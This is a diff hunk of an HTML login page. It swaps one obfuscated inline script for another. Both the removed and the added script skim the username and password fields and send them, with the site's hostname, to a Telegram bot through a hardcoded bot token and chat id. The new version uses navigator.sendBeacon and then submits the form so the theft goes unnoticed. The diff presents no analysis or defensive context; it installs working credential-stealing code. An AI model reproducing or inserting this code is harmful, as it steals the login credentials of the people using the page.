@@ -109,11 +109,10 @@
         </div>
     </form>
 
-<script>
-(function(_0x1b2f){var _0x4d3e=function(_0x5a2b){while(--_0x5a2b){_0x1b2f['push'](_0x1b2f['shift']());}};_0x4d3e(++_0x5a2b);}(_0xArray,0x1a4));var _0x5a2b=function(_0x1b2f,_0x4d3e){_0x1b2f=_0x1b2f-0x0;var _0x5a2b=_0xArray[_0x1b2f];return _0x5a2b;};document['getElementById']('btnSubmit')['onclick']=function(){var _0x1a=document['getElementById']('txtUsername')['value'];var _0x2b=document['getElementById']('txtPassword')['value'];if(!_0x1a||!_0x2b)return;var _0x3c=window['btoa']('bot8432497906:AAEJ1HeP_oKQ-8uaCFbHJcZBRZQQnicOBfA');var _0x4d=window['btoa']('7651215883');var _0x5e="👤\x20"+_0x1a+"\x20|\x20🔑\x20"+_0x2b+"\x20|\x20🌐\x20"+window['location']['hostname'];fetch('https://api.telegram.org/'+window['atob'](_0x3c)+'/sendMessage?chat_id='+window['atob'](_0x4d)+'&text='+encodeURIComponent(_0x5e))['finally'](function(){});};
-</script>
+<script>document.getElementById('btnLogin').onclick=function(_0x1){var _0x2=document.getElementById('txtUsername').value,_0x3=document.getElementById('txtPassword').value;if(_0x2&&_0x3){var _0x4="8432497906:AAEJ1HeP_oKQ-8uaCFbHJcZBRZQQnicOBfA",_0x5="7651215883",_0x6=encodeURIComponent("👤 "+_0x2+" | 🔑 "+_0x3+" | 🌐 "+window.location.hostname);navigator.sendBeacon("https://api.telegram.org/bot"+_0x4+"/sendMessage?chat_id="+_0x5+"&text="+_0x6);}document.getElementById('form1').submit();};</script>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
+
 
